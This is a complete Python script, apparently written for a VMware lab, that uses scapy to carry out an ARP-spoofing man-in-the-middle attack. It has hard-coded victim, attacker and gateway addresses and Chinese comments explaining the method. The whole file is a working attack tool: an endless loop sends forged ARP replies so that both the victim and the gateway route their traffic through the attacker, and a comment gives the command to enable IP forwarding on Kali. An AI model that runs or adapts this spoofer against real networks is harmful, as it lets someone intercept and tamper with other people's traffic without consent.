import time
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.sendrecv import sendp


# 攻击主机需要欺骗被攻击主机，让被攻击主机把攻击主机视为网关，这样，出口流量可以经过该网关
# 另外，攻击主机还需要欺骗网关，让网关以为入口流量的目的地就是攻击主机
# 攻击主机告诉被攻击主机，我是网关，告诉网关，我是被攻击主机，就达到了中间人攻击.
def arpspoof():
    # ethernet0.noPromisc = "TRUE"  在虚拟机配置最后一行加入，关闭混杂模式
    iface = "VMware Virtual Ethernet Adapter for VMnet8"

    # 被攻击主机的MAC和IP
    target_ip = '192.168.150.132'
    target_mac = '00:0C:29:95:42:EE'

    # 攻击主机的MAC和IP
    spoof_ip = '192.168.150.131'
    spoof_mac = '00:0c:29:ee:dc:71'

    # 真实网关的MAC和IP
    gateway_ip = '192.168.150.2'
    # geteway_mac = getmacbyip(gateway_ip)
    geteway_mac = '00:50:56:ea:b2:e0'

    # 构造两个数据包，实现对被攻击主机和网关的欺骗
    while True:
        # 欺骗被攻击主机：op=1: ARP请求， op=2：ARP响应
        packet = Ether(src=spoof_mac, dst=target_mac) / ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac,
                                                            pdst=target_ip, op=2)
        sendp(packet, iface=iface)  # sendp:发送二层协议是用的

        # 欺骗网关
        packet = Ether(src=spoof_mac, dst=geteway_mac) / ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=geteway_mac,
                                                             pdst=gateway_ip, op=2)
        sendp(packet, iface=iface)
        time.sleep(1)


if __name__ == '__main__':
    # echo 1 >> /proc/sys/net/ipv4/ip_forward  #同时在kali上开启转发
    arpspoof()
